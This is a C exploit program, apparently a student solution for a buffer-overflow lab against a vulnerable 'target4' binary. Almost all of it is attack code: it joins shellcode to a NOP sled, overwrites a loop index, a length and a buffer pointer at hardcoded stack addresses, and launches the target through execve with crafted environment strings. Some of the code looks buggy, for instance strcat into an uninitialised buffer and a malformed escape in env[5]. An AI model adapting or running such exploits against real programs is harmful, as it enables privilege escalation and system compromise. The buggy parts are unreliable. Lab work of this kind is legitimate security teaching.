#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"
#define BUF_ADDR 0x3021fdf0
#define I_ADDR 0x3021fe98
#define LEN_ADDR 0x3021fe9c

int main(void)
{
  char *args[3];
  char *env[8];
  char exploit[256];
  int i;
  int *p;

  strcat(exploit, shellcode);
  
  for(i=45; i<190;i++){
    exploit[i]= '\x90';
  }
  
  // p = (int *) &exploit[168];
  // *p = 0x000000bb;

  // p = (int *) &exploit[172];
  // *p = 0x000000ac;
  //overwrite i
  exploit[168]='\xa4';
  exploit[169]='\x00';
  exploit[170]='\x00';
  exploit[171]='\x00';
  //overwrite len
  exploit[172]='\xbb';
  exploit[173]='\x00';
  exploit[174]='\x00';
  exploit[175]='\x00';
  //overwrite buf addr
  exploit[184]='\xf0';
  exploit[185]='\xfd';
  exploit[186]='\x21';
  exploit[187]='\x30';

  exploit[188] = '\0';
  // printf("%d",strlen(exploit));
  args[0] = TARGET; args[1] = exploit; args[2] = NULL;
  // env[0] = NULL;

  env[0] = "\x00";
  env[1] = "\xbb";
  env[2] = "\x00";
  env[3] = "\x00";
  env[4] = "\x00";
  // env[6] = "\x00";
  // env[7] = "\x00";
  env[5] = "xf0\xfd\x21\x30";
  

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
